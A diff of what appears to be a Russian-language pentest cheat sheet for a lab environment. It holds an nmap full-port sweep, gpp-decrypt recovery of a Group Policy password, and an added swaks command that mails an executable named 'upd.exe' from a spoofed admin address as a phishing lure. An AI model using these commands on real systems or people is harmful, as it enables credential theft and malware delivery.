@@ -76,15 +76,6 @@ find . -type f -exec exiftool {} \\;
 	sudo nmap -Pn -n -sV -A -iL hosts/targets.txt -p 0-65535 -oA services/full-sweep --min-rate 50000 --min-hostgroup 100
 
 
-using System;
-
-class Program
-{
-    static void Main()
-    {
-        Console.WriteLine("Привет, мир!");
-    }
-}
 
 # GREP
 
@@ -307,3 +298,6 @@ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH
     затем 
     	gpg --decrypt keyvault.gpg
      
+# Отправка почты 
+
+ 	swaks --to mike@sandbox.local --from admin@sandbox.local --server 192.168.13.37 --attach @upd.exe(прикрепленный файл)
